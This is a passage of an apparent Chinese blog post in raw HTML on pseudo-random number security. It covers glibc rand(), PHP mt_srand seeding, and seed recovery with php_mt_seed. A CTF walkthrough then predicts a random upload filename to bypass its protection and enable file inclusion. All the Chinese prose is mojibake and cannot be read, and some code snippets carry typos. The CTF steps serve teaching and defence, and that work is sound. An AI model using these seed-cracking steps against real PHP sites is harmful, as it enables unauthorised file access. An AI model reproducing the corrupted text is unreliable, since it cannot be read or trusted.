r<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> r<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">31</span><span class="token punctuation">]</span> <span class="token operator">+</span> r<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">344</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">1000</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        r<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> r<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">31</span><span class="token punctuation">]</span> <span class="token operator">+</span> r<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>r<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&gt;&gt;</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™æ®µä»£ç é¦–å…ˆåˆå§‹åŒ–æ•°ç»„ <code>r</code> çš„ç¬¬ä¸€ä¸ªå…ƒç´ ä¸º 1ï¼Œç„¶åé€šè¿‡ä¸€ä¸ªçº¿æ€§åŒä½™ç”Ÿæˆå™¨ç®—æ³•å¡«å……æ•°ç»„çš„å‰ 31 ä¸ªå…ƒç´ ã€‚æ¥ç€ï¼Œå®ƒå°†å‰ 31 ä¸ªå…ƒç´ çš„éƒ¨åˆ†æ•°å€¼å¤åˆ¶åˆ°æ•°ç»„çš„ç¬¬ 31 åˆ° 33 ä¸ªä½ç½®ã€‚ç„¶åï¼Œä»ç¬¬ 34 ä¸ªå…ƒç´ å¼€å§‹ï¼Œæ•°ç»„çš„æ¯ä¸ªå…ƒç´ éƒ½æ˜¯å‰ 31 ä¸ªå…ƒç´ å’Œå‰ 3 ä¸ªå…ƒç´ çš„å’Œã€‚æœ€åï¼Œä»ç¬¬ 344 ä¸ªå…ƒç´ å¼€å§‹ï¼Œç¨‹åºæ‰“å°å‡ºæ•°ç»„ä¸­æ¯ä¸ªå…ƒç´ çš„é«˜ 31 ä½å€¼ã€‚è¿™é‡Œä½¿ç”¨äº†ç±»å‹è½¬æ¢ <code>(unsigned int)</code> å’Œå³ç§»æ“ä½œ <code>&gt;&gt; 1</code> æ¥è·å–é«˜ 31 ä½ã€‚</p><p>ä»ä¸­å‘ç°ï¼Œå½“éšæœºæ•°å¤šäº32ä½æ—¶ï¼Œå¯ä»¥å¯¹åç»­çš„éšæœºæ•°è¿›è¡Œé¢„æµ‹ã€‚</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">31</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">34</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        r<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> r<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">31</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">34</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">344</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        r<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> r<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">31</span><span class="token punctuation">]</span> <span class="token operator">+</span> r<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">344</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">1000</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        r<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> r<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">31</span><span class="token punctuation">]</span> <span class="token operator">+</span> r<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åœ¨mt_randå‡½æ•°ä¸­ï¼Œå¯ä»¥æ ¹æ®mt_srandè¿›è¡Œæ’­ç§ï¼Œå¦‚ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$seed</span> <span class="token operator">=</span> <span class="token number">6666</span><span class="token punctuation">;</span><span class="token function">mt_srand</span> <span class="token punctuation">(</span><span class="token variable">$seed</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$ss</span> <span class="token operator">=</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å½“éšæœºæ•°ç§å­å·²çŸ¥æ—¶ï¼Œç”Ÿæˆçš„éšæœºæ•°åºåˆ—ä¸€è‡´ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$seed</span> <span class="token operator">=</span> <span class="token number">6666</span><span class="token punctuation">;</span><span class="token function">mt_srand</span> <span class="token punctuation">(</span><span class="token variable">$seed</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token operator">=</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token operator">=</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token operator">=</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2024/12/04/mi-ma-xue-suan-fa-an-quan/sui-ji-shu-an-quan/%E6%88%AA%E5%B1%8F2024-12-04%2010.58.57.png" alt="ä¸¤æ¬¡è¿è¡Œçš„ç»“æœä¸€è‡´" style="zoom:50%;"><p>ä¸¤æ¬¡è¿è¡Œçš„ç»“æœä¸€è‡´ã€‚</p><h2 id="3-2-é€†æ¨ä¼ªéšæœºæ•°ç§å­"><a href="#3-2-é€†æ¨ä¼ªéšæœºæ•°ç§å­" class="headerlink" title="3.2 é€†æ¨ä¼ªéšæœºæ•°ç§å­"></a>3.2 é€†æ¨ä¼ªéšæœºæ•°ç§å­</h2><p>åŒæ ·çš„ç§å­èƒ½ç”Ÿæˆå›ºå®šçš„éšæœºæ•°ï¼Œé‚£ä¹ˆä¹Ÿèƒ½æ ¹æ®éšæœºæ•°åœ¨æŸç§ç¨‹åº¦ä¸Šé€†æ¨ç§å­ï¼Œå¯ä»¥é€šè¿‡å¼€æºå·¥å…·php_mt_seedå¯ä»¥å®ç°ï¼š</p><p><a href="https://github.com/openwall/php_mt_seed">https://github.com/openwall/php_mt_seed</a> ã€åœ°å€ã€‘</p><ul><li>ç”¨æ³•ç¤ºä¾‹</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ php5 <span class="token parameter variable">-r</span> <span class="token string">'mt_srand(1234567890); echo mt_rand(), "\n";'</span><span class="token number">1328851649</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">time</span> ./php_mt_seed <span class="token number">1328851649</span>    Pattern: EXACT    Version: <span class="token number">3.0</span>.7 to <span class="token number">5.2</span>.0    Found <span class="token number">0</span>, trying 0xfc000000 - 0xffffffff, speed <span class="token number">16261.0</span> Mseeds/s     Version: <span class="token number">5.2</span>.1+    Found <span class="token number">0</span>, trying 0x1e000000 - 0x1fffffff, speed <span class="token number">91.8</span> Mseeds/s     seed <span class="token operator">=</span> 0x1fd65f9a <span class="token operator">=</span> <span class="token number">534142874</span> <span class="token punctuation">(</span>PHP <span class="token number">7.1</span>.0+<span class="token punctuation">)</span>    Found <span class="token number">1</span>, trying 0x26000000 - 0x27ffffff, speed <span class="token number">91.9</span> Mseeds/s     seed <span class="token operator">=</span> 0x273a3517 <span class="token operator">=</span> <span class="token number">658126103</span> <span class="token punctuation">(</span>PHP <span class="token number">5.2</span>.1 to <span class="token number">7.0</span>.x<span class="token punctuation">;</span> HHVM<span class="token punctuation">)</span>    Found <span class="token number">2</span>, trying 0x48000000 - 0x49ffffff, speed <span class="token number">91.9</span> Mseeds/s     seed <span class="token operator">=</span> 0x499602d2 <span class="token operator">=</span> <span class="token number">1234567890</span> <span class="token punctuation">(</span>PHP <span class="token number">5.2</span>.1 to <span class="token number">7.0</span>.x<span class="token punctuation">;</span> HHVM<span class="token punctuation">)</span>    seed <span class="token operator">=</span> 0x499602d2 <span class="token operator">=</span> <span class="token number">1234567890</span> <span class="token punctuation">(</span>PHP <span class="token number">7.1</span>.0+<span class="token punctuation">)</span>    Found <span class="token number">4</span>, trying 0xfe000000 - 0xffffffff, speed <span class="token number">91.9</span> Mseeds/s     Found <span class="token number">4</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç”±äºæ˜¯é€†æ¨ï¼Œå¯èƒ½å­˜åœ¨å¤šå€¼ã€‚</p><p>æä¾›çš„éšæœºæ•°åºåˆ—é•¿åº¦è¶Šé•¿ï¼Œé€†æ¨è¶Šç²¾ç¡®ã€‚</p><h2 id="3-3-å®ä¾‹åˆ†æ"><a href="#3-3-å®ä¾‹åˆ†æ" class="headerlink" title="3.3 å®ä¾‹åˆ†æ"></a>3.3 å®ä¾‹åˆ†æ</h2><h3 id="3-3-1-ä»£ç å®¡è®¡"><a href="#3-3-1-ä»£ç å®¡è®¡" class="headerlink" title="3.3.1 ä»£ç å®¡è®¡"></a>3.3.1 ä»£ç å®¡è®¡</h3><p>ä»¥æŸå›½å†…èµ›äº‹çš„é¢˜ç›®ä¸ºä¾‹è®²è§£ä¼ªéšæœºæ•°å®‰å…¨ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">random_str</span><span class="token punctuation">(</span><span class="token variable">$length</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"32"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$set</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"a"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"A"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"b"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"B"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"c"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"C"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"d"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"D"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"e"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"E"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"f"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"F"</span><span class="token punctuation">,</span>    <span class="token string double-quoted-string">"g"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"G"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"h"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"H"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"i"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"I"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"j"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"J"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"k"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"K"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"l"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"L"</span><span class="token punctuation">,</span>    <span class="token string double-quoted-string">"m"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"M"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"n"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"N"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"o"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"O"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"p"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"P"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"q"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"Q"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"r"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"R"</span><span class="token punctuation">,</span>    <span class="token string double-quoted-string">"s"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"S"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"t"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"T"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"u"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"U"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"v"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"V"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"w"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"W"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"x"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"X"</span><span class="token punctuation">,</span>    <span class="token string double-quoted-string">"y"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"Y"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"z"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"Z"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"2"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"3"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"4"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"5"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"6"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"7"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"8"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"9"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;=</span> <span class="token variable">$length</span><span class="token punctuation">;</span> <span class="token operator">++</span><span class="token variable">$i</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$set</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$str</span> <span class="token operator">.=</span> <span class="token variable">$set</span><span class="token punctuation">[</span><span class="token variable">$ch</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token variable">$str</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$seed</span> <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">9999999999</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">mt_srand</span><span class="token punctuation">(</span><span class="token variable">$seed</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$ss</span> <span class="token operator">=</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$hash</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">session_id</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token variable">$ss</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'SESSION'</span><span class="token punctuation">,</span> <span class="token variable">$hash</span><span class="token punctuation">,</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">3600</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'./up104Ds/'</span> <span class="token operator">.</span> <span class="token function">random_str</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'_'</span> <span class="token operator">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file-upload-field'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>ä»£ç å®¡è®¡</li></ul><blockquote><ol><li><strong>random_str å‡½æ•°</strong>ï¼šè¿™ä¸ªå‡½æ•°ç”¨äºç”Ÿæˆä¸€ä¸ªæŒ‡å®šé•¿åº¦çš„éšæœºå­—ç¬¦ä¸²ã€‚å®ƒä½¿ç”¨äº†ä¸€ä¸ªåŒ…å«å¤§å°å†™å­—æ¯å’Œæ•°å­—çš„å­—ç¬¦é›† <code>$set</code>ã€‚é€šè¿‡å¾ªç¯ï¼Œæ¯æ¬¡ä»å­—ç¬¦é›†ä¸­éšæœºé€‰æ‹©ä¸€ä¸ªå­—ç¬¦å¹¶æ‹¼æ¥åˆ°ç»“æœå­—ç¬¦ä¸² <code>$str</code> ä¸­ã€‚</li><li>**session_start()**ï¼šå¯åŠ¨ä¼šè¯ï¼Œè¿™æ˜¯ PHP ä¸­ç”¨äºç®¡ç†ç”¨æˆ·ä¼šè¯çš„å‡½æ•°ã€‚</li><li><strong>$seed</strong>ï¼šç”Ÿæˆä¸€ä¸ªéšæœºç§å­ï¼Œç”¨äºåˆå§‹åŒ–éšæœºæ•°ç”Ÿæˆå™¨ï¼Œä»¥ç¡®ä¿æ¯æ¬¡ç”Ÿæˆçš„éšæœºæ•°åºåˆ—éƒ½ä¸åŒã€‚</li><li>**mt_srand($seed)**ï¼šä½¿ç”¨ <code>$seed</code> åˆå§‹åŒ– Mersenne Twister éšæœºæ•°ç”Ÿæˆå™¨ã€‚</li><li>**$ss = mt_rand()**ï¼šä½¿ç”¨ Mersenne Twister ç®—æ³•ç”Ÿæˆä¸€ä¸ªéšæœºæ•°ã€‚</li><li>**$hash = md5(session_id() . $ss)**ï¼šå°†ä¼šè¯ ID å’Œéšæœºæ•° <code>$ss</code> è¿æ¥èµ·æ¥ï¼Œç„¶åä½¿ç”¨ MD5 ç®—æ³•ç”Ÿæˆä¸€ä¸ªå“ˆå¸Œå€¼ã€‚</li><li>**setcookie(â€˜SESSIONâ€™, $hash, time() + 3600)**ï¼šè®¾ç½®ä¸€ä¸ªåä¸º â€˜SESSIONâ€™ çš„ cookieï¼Œå…¶å€¼ä¸ºç”Ÿæˆçš„å“ˆå¸Œå€¼ï¼Œæœ‰æ•ˆæœŸä¸º 1 å°æ—¶ï¼ˆ3600 ç§’ï¼‰ã€‚</li><li><strong>$filename</strong>ï¼šæ„é€ ä¸€ä¸ªæ–‡ä»¶åï¼Œè¯¥æ–‡ä»¶åç”±ä¸€ä¸ªéšæœºå­—ç¬¦ä¸²å’Œä¸Šä¼ æ–‡ä»¶çš„åŸå§‹æ–‡ä»¶åç»„æˆï¼Œç”¨äºä¿å­˜ä¸Šä¼ çš„æ–‡ä»¶ã€‚</li></ol></blockquote><h3 id="3-3-2-ç›®æ ‡â€”â€”é¢„æµ‹æ–‡ä»¶å"><a href="#3-3-2-ç›®æ ‡â€”â€”é¢„æµ‹æ–‡ä»¶å" class="headerlink" title="3.3.2 ç›®æ ‡â€”â€”é¢„æµ‹æ–‡ä»¶å"></a>3.3.2 ç›®æ ‡â€”â€”é¢„æµ‹æ–‡ä»¶å</h3><p>æ–‡ä»¶åçš„ç»„æˆå¦‚ä¸‹ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token string">'./up104Ds/'</span> <span class="token builtin class-name">.</span> random_str<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token builtin class-name">.</span> <span class="token string">'_'</span> <span class="token builtin class-name">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file-upload-field'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>./up104Ds/+éšæœºæ–‡ä»¶å+<span class="token string">"_"</span>+ä¸Šä¼ æ—¶çš„æ–‡ä»¶å<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>éšæœºæ•°çš„ç”Ÿæˆä¸»è¦ä¾èµ–äºï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$set</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">.=</span> <span class="token variable">$set</span><span class="token punctuation">[</span><span class="token variable">$ch</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="3-3-3-è§£å†³æ€è·¯"><a href="#3-3-3-è§£å†³æ€è·¯" class="headerlink" title="3.3.3 è§£å†³æ€è·¯"></a>3.3.3 è§£å†³æ€è·¯</h3><h4 id="1ï¼‰è·å–æ’­ç§åç¬¬ä¸€æ¬¡ç”Ÿæˆçš„éšæœºæ•°"><a href="#1ï¼‰è·å–æ’­ç§åç¬¬ä¸€æ¬¡ç”Ÿæˆçš„éšæœºæ•°" class="headerlink" title="1ï¼‰è·å–æ’­ç§åç¬¬ä¸€æ¬¡ç”Ÿæˆçš„éšæœºæ•°"></a>1ï¼‰è·å–æ’­ç§åç¬¬ä¸€æ¬¡ç”Ÿæˆçš„éšæœºæ•°</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$seed</span> <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">9999999999</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">mt_srand</span><span class="token punctuation">(</span><span class="token variable">$seed</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$ss</span> <span class="token operator">=</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$hash</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">session_id</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token variable">$ss</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'SESSION'</span><span class="token punctuation">,</span> <span class="token variable">$hash</span><span class="token punctuation">,</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">3600</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¼šè¯æœªå»ºç«‹æ—¶ï¼Œsession_id()çš„å€¼ä¸ºç©ºï¼Œåˆ™$hashçš„å€¼ä¸ºmd5(ç¬¬ä¸€ä¸ªéšæœºæ•°)</p><p>é€šè¿‡ç ´è§£å“ˆå¸Œå€¼ï¼Œçš„åˆ°ç¬¬ä¸€ä¸ªéšæœºæ•°ï¼š1608834717</p><h4 id="2ï¼‰æ¨æ–­ç§å­"><a href="#2ï¼‰æ¨æ–­ç§å­" class="headerlink" title="2ï¼‰æ¨æ–­ç§å­"></a>2ï¼‰æ¨æ–­ç§å­</h4><p>æ­¤æ—¶å¯ä»¥é€šè¿‡php_mt_srandåæ¨éšæœºæ•°ç§å­ï¼š</p><blockquote><p>./php_mt_seed 1608834717</p><p>Found 0, trying 335544320 - 369098751, speed 49932190 seeds per second</p><p>seed = 353675865</p></blockquote><h4 id="3ï¼‰æ¨æ–­éšæœºæ•°åºåˆ—"><a href="#3ï¼‰æ¨æ–­éšæœºæ•°åºåˆ—" class="headerlink" title="3ï¼‰æ¨æ–­éšæœºæ•°åºåˆ—"></a>3ï¼‰æ¨æ–­éšæœºæ•°åºåˆ—</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php">mt <span class="token function">srand</span><span class="token punctuation">(</span><span class="token number">353675865</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> mt <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">mt_rand</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./php mt_rand.php<span class="token number">1608834717</span><span class="token number">364052752</span><span class="token number">104617820</span><span class="token number">1855329673</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="4ï¼‰é¢„æµ‹æ–‡ä»¶å"><a href="#4ï¼‰é¢„æµ‹æ–‡ä»¶å" class="headerlink" title="4ï¼‰é¢„æµ‹æ–‡ä»¶å"></a>4ï¼‰é¢„æµ‹æ–‡ä»¶å</h4><p>é¢„æµ‹å‡ºéšæœºæ•°åºåˆ—ä¹‹åï¼Œä¾¿å¯ä»¥é¢„æµ‹å‡ºéšæœºæ–‡ä»¶åçš„æ¯ä¸€ä½ï¼Œä»è€Œæœ€ç»ˆè·å¾—æ–‡ä»¶åã€‚</p><p>æœ€ç»ˆå¯ä»¥ç»•è¿‡éšæœºæ–‡ä»¶åé˜²æŠ¤ï¼Œå®ç°æ–‡ä»¶åŒ…å«ç­‰æ¼æ´çš„åˆ©ç”¨ã€‚</p><h1 id="å››ã€æ€»ç»“"><a href="#å››ã€æ€»ç»“" class="headerlink" title="å››ã€æ€»ç»“"></a>å››ã€æ€»ç»“</h1><p>ä¼ªéšæœºæ•°ç”Ÿæˆçš„å®‰å…¨æ€§å¯¹è®¸å¤šåº”ç”¨è‡³å…³é‡è¦ï¼Œå°¤å…¶æ˜¯åœ¨å¯†ç å­¦é¢†åŸŸã€‚ä¸ºäº†ç¡®ä¿ä¼ªéšæœºæ•°çš„å®‰å…¨æ€§ï¼Œå¿…é¡»è€ƒè™‘ä»¥ä¸‹å‡ ä¸ªæ–¹é¢ï¼š</p><ol><li><strong>ä½¿ç”¨åŠ å¯†å®‰å…¨çš„ä¼ªéšæœºæ•°ç”Ÿæˆå™¨ï¼ˆCSPRNGï¼‰</strong>ã€‚</li><li><strong>å¢åŠ 